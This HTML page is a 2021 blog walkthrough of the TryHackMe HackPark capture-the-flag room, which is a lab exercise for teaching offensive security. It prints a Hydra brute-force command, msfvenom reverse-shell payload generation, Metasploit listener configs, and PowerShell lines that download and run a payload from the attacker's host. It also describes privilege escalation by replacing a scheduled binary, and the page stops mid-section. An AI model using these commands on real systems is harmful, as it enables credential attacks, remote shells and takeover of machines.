<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>TryHackMe Room Hackpark | Classroom</title>

    
<link href="/img/avatar.jpeg" rel="shortcut icon" type="image/x-icon" />





<meta name="author" content="Animesh Roy @anir0y  "  />
<meta name="description" content="TryHackMe Room HackPark solved by Animesh Roy. this is a walkthough. read more..." />



<title>Animesh Roy | Classroom Posts</title>
<meta name="title" content="Animesh Roy | Blogs & Writeups">
<meta name="description" content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways.">


<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-SPD6BXK0P5');
</script>



<script type="text/javascript">
  (function(c,l,a,r,i,t,y){
      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
  })(window, document, "clarity", "script", "it10lq8bk1");
</script>



<meta property="og:type" content="website">
<meta property="og:url" content="https://classroom.anir0y.in/">
<meta property="og:title" content="Animesh Roy | Blogs & Writeups">
<meta property="og:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
<meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">


<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>


<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="http://localhost:1313/post/thm-room-hackpark/">

<meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
<meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
<meta property="twitter:image" content="https://i.imgur.com/Ji5C41H.png">







<script data-ad-client="ca-pub-3526678290068011" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>




<link rel="canonical" href="http://localhost:1313/post/thm-room-hackpark/" />


<meta property="og:url" content="http://localhost:1313/post/thm-room-hackpark/">
  <meta property="og:site_name" content="Classroom">
  <meta property="og:title" content="TryHackMe Room Hackpark">
  <meta property="og:description" content="TryHackMe Room HackPark solved by Animesh Roy. this is a walkthough. read more...">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2021-06-19T19:38:27+05:30">
    <meta property="article:modified_time" content="2021-06-19T19:38:27+05:30">
    <meta property="article:tag" content="Tryhackme">
    <meta property="article:tag" content="Rooms">
    <meta property="article:tag" content="Thm">
    <meta property="article:tag" content="HackPark">




  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="TryHackMe Room Hackpark">
  <meta name="twitter:description" content="TryHackMe Room HackPark solved by Animesh Roy. this is a walkthough. read more...">


<link rel="stylesheet" href="/css/semantic.min.css" />
<link rel="stylesheet" href="/css/icomoon.css" />
<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
<link rel="stylesheet" href="/css/github-markdown.css" />
<link rel="stylesheet" href="/css/site.css" />
<link rel="stylesheet" href="/css/custom.css" />

<style>
  a:not(.ui.button):hover {
    text-decoration: underline;
  }

  
  a:not(.ui.button) {
    color: seagreen !important;
  }
  

  
  .inverted a:not(.ui.button),
  .inverted a:not(.ui.button):hover {
     color: darkseagreen !important;
  }
  

  
  body.default {
    
    background-color: #fff;
    

    
  }
  

  
  body.dark {
    
    background-color: black;
    

    
  }
  
</style>


    



<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css" />







    
    <link rel="stylesheet" href="/css/custom.css" />
    
  </head>

  <body class="default">
    
<nav class="ui secondary menu dream-menu">

  <div class="item">
    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
  </div>
  <div class="item">
    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
  </div>
  
  <div class="item">
    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
  </div>
  
  
  <div class="item">
    <i class="large link search icon" onclick="toggleSearch()"></i>
  </div>
  
</nav>

    <div class="flip-container">
      <div class="flipper">
        <section class="front">
          <div class="dream-max-width">
            
<div class="ui relaxed grid dream-grid dream-grid-single"style="flex-direction: row-reverse;">
  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
    
    
    <div class="ui segment toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#hackpark">HackPark</a></li>
    <li><a href="#task-01-deploy-the-vulnerable-windows-machine">task 01: Deploy the vulnerable Windows machine</a>
      <ul>
        <li><a href="#flags">Flags</a></li>
      </ul>
    </li>
    <li><a href="#task-02-using-hydra-to-brute-force-a-login">task 02: Using Hydra to brute-force a login</a>
      <ul>
        <li><a href="#flags-21">Flags 2.1</a></li>
        <li><a href="#flag--22">Flag  2.2</a></li>
      </ul>
    </li>
    <li><a href="#task-03--compromise-the-machine">task 03:  Compromise the machine</a>
      <ul>
        <li><a href="#flag-31">Flag 3.1</a></li>
        <li><a href="#flag-32">flag 3.2</a></li>
        <li><a href="#flag-33">flag 3.3</a></li>
      </ul>
    </li>
    <li><a href="#task-04-windows-privilege-escalation">task 04: Windows Privilege Escalation</a>
      <ul>
        <li><a href="#flag-41">Flag 4.1</a></li>
        <li><a href="#flag-42">Flag 4.2</a></li>
        <li><a href="#flag-43">Flag 4.3</a></li>
        <li><a href="#flag-44">Flag 4.4</a></li>
        <li><a href="#flag-45">Flag 4.5</a></li>
      </ul>
    </li>
    <li><a href="#task-05-privilege-escalation-without-metasploit">Task 05: Privilege Escalation Without Metasploit</a>
      <ul>
        <li><a href="#flag-51">Flag 5.1</a></li>
        <li><a href="#flag-52">Flag 5.2</a></li>
        <li><a href="#flag-53">Flag 5.3</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    
    <div class="ui segment actions">
      <button
        class="ui circular icon button save-as-image"
        title="Save as image"
        onclick="savePostAsImg()">
        <i class="save icon"></i>
      </button>

      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Room%20Hackpark&url=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-hackpark%2f" class="ui circular twitter icon button">
  <i class="twitter icon"></i>
</a>
<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2fthm-room-hackpark%2f" class="ui circular facebook icon button">
  <i class="facebook icon"></i>
</a>

    </div>
  </aside>
  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
    
    <section class="ui top attached segment">
      <header>
        <h1 class="ui large header">TryHackMe Room Hackpark<div class="sub header">
            @
            
              
                <a href="https://bit.ly/34sGFiK" target="_blank">Animesh Roy</a>
              
            

            | 
                Saturday, Jun 19, 2021
              

            | 5 minutes read

            | Update at
              
                Saturday, Jun 19, 2021
              
          </div>
        </h1>
      </header>

      <article class="main"><h2 id="hackpark">HackPark</h2>
<p>Room link : <a href="https://tryhackme.com/room/hackpark">HackPark</a></p>
<h2 id="task-01-deploy-the-vulnerable-windows-machine">task 01: Deploy the vulnerable Windows machine</h2>
<p>This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.</p>
<h3 id="flags">Flags</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Flag-ID</th>
          <th>question</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">1</td>
          <td>Deploy the machine and access its web server.</td>
      </tr>
      <tr>
          <td style="text-align: left">2</td>
          <td>Whats the name of the clown displayed on the homepage?</td>
      </tr>
      <tr>
          <td style="text-align: left"></td>
          <td>download the img and do a reverse Image search ans is <code>PENNYWISE</code></td>
      </tr>
  </tbody>
</table>
<h2 id="task-02-using-hydra-to-brute-force-a-login">task 02: Using Hydra to brute-force a login</h2>
<p><img src="https://i.imgur.com/8wR5oby.png" alt="hydra"></p>
<p><strong>1 : find the directory using <code>gobuster</code></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.135.139/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.1.0
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.135.139/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2021/06/19 20:08:03 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/account              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 152<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.135.139/account/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 173<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.135.139/Account/login.aspx?ReturnURL<span style="color:#f92672">=</span>/admin<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
</span></span></code></pre></div><p>we got <code>/admin</code> dir here, let&rsquo;s check this out.</p>
<p><img src="https://i.imgur.com/Gf2QJCB.png" alt="img"></p>
<h3 id="flags-21">Flags 2.1</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Flag-ID</th>
          <th>question</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">1</td>
          <td>What request type is the Windows website login form using?</td>
      </tr>
      <tr>
          <td style="text-align: left"></td>
          <td><code>POST</code></td>
      </tr>
  </tbody>
</table>
<h3 id="flag--22">Flag  2.2</h3>
<p>Hydra bruteforce command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.135.139 http-post-form <span style="color:#e6db74">&#34;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=eRnxFX0KeP0JSP3NUgJuQNgMv0s2Vbi3LgmkZ1b13u5XVzxoWRsgjuZ1i9zBwladu1Sn2olX%2BOFslf3MYIG%2BlcCFhPNOo39g9aaorqmfZ93BBwYH%2BU66nHfBoPd6mu2nKWfs4%2FFZacIS%2Ff1LUkpUlG29J6pqWWdWu1XGrlgHl4lNicNd&amp;__EVENTVALIDATION=fLvo1twKPtwoRdRfJPlthZ9VW0RmhUAGor8gmqwlkM3r%2BiRaQAOP97BUNWjE%2BbVSNzZnye1kEuI2S72bUGOZqDPu0E7weYfJPUYT6xHHJ0%2F8wMA8ovjF9GRdvpIR0cHRYE%2BLAC2eUQ5%2ByMBbSzIv92ZRoxDToB5I4z4eiaYaGYKRGxvj&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&#34;</span>
</span></span></code></pre></div><p><img src="https://i.imgur.com/0DSaivn.png" alt="img"></p>
<hr>
<!-- Amazon Ads-->
<script type="text/javascript" language="javascript">
      var aax_size='300x250';
      var aax_pubname = 'anir0y-21';
      var aax_src='302';
    </script>
<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
<!-- Amazon Ads-->
<hr>
<h2 id="task-03--compromise-the-machine">task 03:  Compromise the machine</h2>
<p>Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)</p>
<p>Exploit: <a href="https://www.exploit-db.com/exploits/46353">Exploit-DB</a></p>
<h3 id="flag-31">Flag 3.1</h3>
<p><strong>Now you have logged into the website, are you able to identify the version of the BlogEngine?</strong></p>
<p><img src="https://i.imgur.com/9Gi3vyr.png" alt="img"></p>
<blockquote>
<p>add <code>CVE-</code> then the exploit ID</p>
</blockquote>
<h3 id="flag-32">flag 3.2</h3>
<p><strong>What is the CVE?</strong></p>
<p><img src="https://i.imgur.com/aCgsF9E.png" alt="anir0y"></p>
<h3 id="flag-33">flag 3.3</h3>
<p><strong>Who is the webserver running as?</strong></p>
<p>get the reverse connection working as mentioned in <code>exploit page</code>, once that done run <code>whoami</code> command to get the ans.</p>
<p><img src="https://i.imgur.com/PciOlWs.png" alt="img"></p>
<hr>
<h2 id="task-04-windows-privilege-escalation">task 04: Windows Privilege Escalation</h2>
<ul>
<li>generate the shell</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/thm/room/hackpark/www<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost<span style="color:#f92672">=</span>10.17.4.40 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f exe -o supershell.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">510</span> bytes
</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">7168</span> bytes
</span></span><span style="display:flex;"><span>Saved as: supershell.exe
</span></span></code></pre></div><ul>
<li>msf.rc conf</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/hackpark<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat www/msf.rc 
</span></span><span style="display:flex;"><span>use exploit/multi/handler
</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>set lhost 10.17.4.40
</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span>set exitonsession false
</span></span><span style="display:flex;"><span>exploit -j 
</span></span></code></pre></div><ul>
<li>run the listener</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/hackpark<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ msfconsole -q -r msf.rc 
</span></span></code></pre></div><ul>
<li>run the webserver (linux)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Change dir where is your exe file located</span>
</span></span><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#my exe is supershell.exe.exe</span>
</span></span></code></pre></div><ul>
<li>download shell on target</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># download </span>
</span></span><span style="display:flex;"><span>c:\Windows\Temp&gt;powershell -c <span style="color:#e6db74">&#34;Invoke-WebRequest -Uri &#39;http://10.17.4.40/supershell.exe&#39; -OutFile &#39;shell.exe&#39;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#execute</span>
</span></span><span style="display:flex;"><span>c:\Windows\Temp&gt;.\shell.exe
</span></span></code></pre></div><ul>
<li>Msfconsole</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">200262</span> bytes<span style="color:#f92672">)</span> to 10.10.135.139
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.17.4.40:1337 -&gt; 10.10.135.139:49301<span style="color:#f92672">)</span> at 2021-06-19 21:01:05 +0530
</span></span></code></pre></div><ul>
<li>get root</li>
</ul>
<p><img src="https://i.imgur.com/FfBMkJj.png" alt="getroot"></p>
<p>upload shell to <code>C:\Program Files (x86)\SystemScheduler</code> chage <code>shell.exe</code> to <code>Message.exe</code></p>
<h3 id="flag-41">Flag 4.1</h3>
<p><strong>Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!</strong>
no ans required</p>
<h3 id="flag-42">Flag 4.2</h3>
<p><strong>What is the OS version of this windows machine?</strong></p>
<p>run sysinfo in meterpreter shell.</p>
<p><img src="https://i.imgur.com/lUhkQkJ.png" alt="msf"></p>
<h3 id="flag-43">Flag 4.3</h3>
<p><strong>What is the name of the abnormal service running?</strong></p>
<p><code>WScheduler.exe</code> names as <code>WindowsScheduler</code></p>
<h3 id="flag-44">Flag 4.4</h3>
<p><strong>What is the name of the binary you&rsquo;re supposed to exploit?</strong></p>
<p><code>Message.exe</code></p>
<ul>
<li>find the log in <code>C:\Program Files (x86)\SystemScheduler\Events</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing<span style="color:#960050;background-color:#1e0010">:</span> C:\Program Files (x86)\SystemScheduler\Events
</span></span><span style="display:flex;"><span>======================================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size   Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----   ----  -------------              ----
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">1926</span>   fil   <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">08</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">35</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">+0530</span>  <span style="color:#ae81ff">20198415519</span>.INI
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">31219</span>  fil   <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">08</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">36</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">+0530</span>  <span style="color:#ae81ff">20198415519</span>.INI_LOG.txt
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">290</span>    fil   <span style="color:#ae81ff">2020</span>-<span style="color:#ae81ff">10</span>-<span style="color:#ae81ff">03</span> <span style="color:#ae81ff">03</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">12</span> <span style="color:#ae81ff">+0530</span>  <span style="color:#ae81ff">2020102145012</span>.INI
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">186</span>    fil   <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">06</span>-<span style="color:#ae81ff">19</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">+0530</span>  Administrator.flg
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">182</span>    fil   <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">06</span>-<span style="color:#ae81ff">19</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">39</span> <span style="color:#ae81ff">+0530</span>  SYSTEM_svc.flg
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">0</span>      fil   <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">06</span>-<span style="color:#ae81ff">19</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">+0530</span>  Scheduler.flg
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">449</span>    fil   <span style="color:#ae81ff">2019</span>-<span style="color:#ae81ff">08</span>-<span style="color:#ae81ff">04</span> <span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">06</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">53</span> <span style="color:#ae81ff">+0530</span>  SessionInfo.flg
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100666</span>/rw-rw-rw-  <span style="color:#ae81ff">0</span>      fil   <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">06</span>-<span style="color:#ae81ff">19</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">39</span> <span style="color:#ae81ff">+0530</span>  service.flg
</span></span></code></pre></div><ul>
<li>read the log</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>...[<span style="color:#66d9ef">snip</span>]...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>/<span style="color:#ae81ff">19</span>/<span style="color:#ae81ff">21</span> <span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">33</span>,<span style="color:#66d9ef">Process</span> Ended. PID<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1852</span>,ExitCode<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4</span>,Message.exe (Administrator)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>/<span style="color:#ae81ff">19</span>/<span style="color:#ae81ff">21</span> <span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">53</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">01</span>,Event Started Ok, (Administrator)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>/<span style="color:#ae81ff">19</span>/<span style="color:#ae81ff">21</span> <span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">53</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">33</span>,<span style="color:#66d9ef">Process</span> Ended. PID<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1688</span>,ExitCode<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4</span>,Message.exe (Administrator)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>/<span style="color:#ae81ff">19</span>/<span style="color:#ae81ff">21</span> <span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">54</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span>,Event Started Ok, (Administrator)
</span></span><span style="display:flex;"><span>...[<span style="color:#66d9ef">snip</span>]...
</span></span></code></pre></div><h3 id="flag-45">Flag 4.5</h3>
<p><strong>What is the user flag (on Jeffs Desktop)?</strong></p>
<p>we already have <code>admininstrator</code> shell to view flags.</p>
<p><img src="https://i.imgur.com/e13TbCz.png" alt="jeff"></p>
<p><strong>What is the root flag?</strong></p>
<p><img src="https://i.imgur.com/zQpqsZ0.png" alt="root-flag"></p>
<hr>
<h2 id="task-05-privilege-escalation-without-metasploit">Task 05: Privilege Escalation Without Metasploit</h2>
<p>In this task we will escalate our privileges without the use of meterpreter/metasploit!
Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.
Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.</p>
<p><em><strong>Tools</strong></em></p>
<ul>
<li>winpeas: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat">Download</a></li>
</ul>
<h3 id="flag-51">Flag 5.1</h3>
<p>Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let&rsquo;s set our payload to <code>windows/shell_reverse_tcp</code></p>
<ul>
<li>
<p>used this <a href="https://shell.anir0y.in/">website</a> to generate the shellcode.</p>
</li>
<li>
<p>msf.rc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#saved as shell.rc</span>
</span></span><span style="display:flex;"><span>use exploit/multi/handler
</span></span><span style="display:flex;"><span>set payload windows/x64/shell_reverse_tcp 
</span></span><span style="display:flex;"><span>set lhost 10.17.4.40
</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span>set exitonsession false
</span></span><span style="display:flex;"><span>exploit -j
</span></span></code></pre></div></li>
<li>
<p>run listener
<code>msfconsole -r shell.rc</code></p>
</li>
<li>
<p>upload the file
<code>powershell -c &quot;Invoke-WebRequest -Uri 'http://10.17.4.40/reverse.exe' -OutFile 'rev.exe'&quot;</code></p>
</li>
<li>
<p>run the file</p>
</li>
</ul>
<h3 id="flag-52">Flag 5.2</h3>
<p>Tip: It&rsquo;s common to find C:\Windows\Temp is world writable!</p>
<h3 id="flag-53">Flag 5.3</h3>
<p>WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!</p>
<blockquote>
